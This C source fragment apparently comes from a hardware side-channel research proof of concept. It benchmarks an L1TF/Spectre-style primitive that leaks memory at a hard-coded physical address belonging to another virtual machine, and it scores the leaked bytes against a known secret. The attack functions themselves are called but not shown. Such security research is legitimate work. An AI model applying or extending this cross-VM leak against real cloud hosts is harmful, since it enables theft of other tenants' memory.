
// rain-vm-gce's data at pa 0x8a6de5e00+0x100
char secret[] = {
	0x12, 0x01, 0x00, 0x03, 0x09, 0x00, 0x03, 0x09, 0x6b, 0x1d, 0x05, 0x03, 0x06, 0x02, 0x0b, 0x0f,
	0x01, 0x01, 0x09, 0x02, 0x1f, 0x00, 0x01, 0x01, 0x00, (char)0xe0, 0x00, 0x09, 0x04, 0x00, 0x00, 0x01,
	0x09, 0x00, 0x00, 0x00, 0x07, 0x05, (char)0x81, 0x03, 0x04, 0x00, 0x0c, 0x06, 0x30, 0x00, 0x00, 0x02,
	0x00, (char)0x90, 0x1a, 0x00, 0x74, 0x62, 0x70, 0x66, 0x5f, 0x70, 0x72, 0x6f, 0x67, 0x5f, 0x36, 0x64,
};

void initial_secret_recovery(uintptr_t base)
{
	uintptr_t leak_pa = 0x8a6de5e00 + 0x100;
	half_spectre_start(base, leak_pa);
	l1tf_do_leak(leak_pa, 0x10);
	half_spectre_stop();
}

void display_data(char *data)
{
	for (int i = 0; i < 4; i++)
		printf("%16lx %16lx\n", *(uint64_t *)(data+i*0x10), *(uint64_t *)(data+i*0x10+8));
}

int check_correctness(char *data)
{
	const int verbose = 2;

	if (verbose >= 2) display_data(data);

	int errors = 0;
	int correct_bytes = 0;
	for (int i = 0; i < 64; i++) {
		if (data[i] == secret[i])
			correct_bytes++;
		else
			errors++;
	}
	int correct_nibbles = 0;
	for (int i = 0; i < 64; i++) {
		correct_nibbles += (data[i] & 0x0f) == (secret[i] & 0x0f);
		correct_nibbles += (data[i] & 0xf0) == (secret[i] & 0xf0);
	}
	int correct_bits = 0;
	for (int i = 0; i < 64; i++)
		for (int b = 0; b < 8; b++)
			correct_bits += (data[i] & (1 << b)) == (secret[i] & (1 << b));
	if (verbose) printf("all:            %2d / %2d bytes,  %3d / %2d nibbles,  %3d / %3d bits\n", correct_bytes, 64, correct_nibbles, 2*64, correct_bits, 8*64);

	correct_bytes = 0;
	int nonzero_bytes = 0;
	for (int i = 0; i < 64; i++) {
		if (secret[i] != 0) {
			nonzero_bytes++;
			correct_bytes += data[i] == secret[i];
		}
	}
	correct_nibbles = 0;
	for (int i = 0; i < 64; i++) {
		if (secret[i] != 0) {
			correct_nibbles += (data[i] & 0x0f) == (secret[i] & 0x0f);
			correct_nibbles += (data[i] & 0xf0) == (secret[i] & 0xf0);
		}
	}
	correct_bits = 0;
	for (int i = 0; i < 64; i++)
		if (secret[i] != 0)
			for (int b = 0; b < 8; b++)
				correct_bits += (data[i] & (1 << b)) == (secret[i] & (1 << b));
	if (verbose) printf("non-zero bytes: %2d / %2d bytes,  %3d / %2d nibbles,  %3d / %3d bits\n", correct_bytes, nonzero_bytes, correct_nibbles, 2*nonzero_bytes, correct_bits, 8*nonzero_bytes);

	return errors;
}

void benchmark_leakage_primitive(uintptr_t base)
{
	char *data;
	int errors;
	uint64_t t0;
	double time;
	uintptr_t leak_pa = 0x8a6de5e00 + 0x100;

	display_data(secret);
	for (int i = 0; i < 3; i++) {
		t0 = clock_read();
		data = thijs_l1tf_leak(base, leak_pa + 0x40, 0x40);
		time = (clock_read()-t0)/1000000000.0;
		errors = check_correctness(data);
		free(data);
		printf("time = %8.1f | errors = %3d\n", time, errors);
	}
}
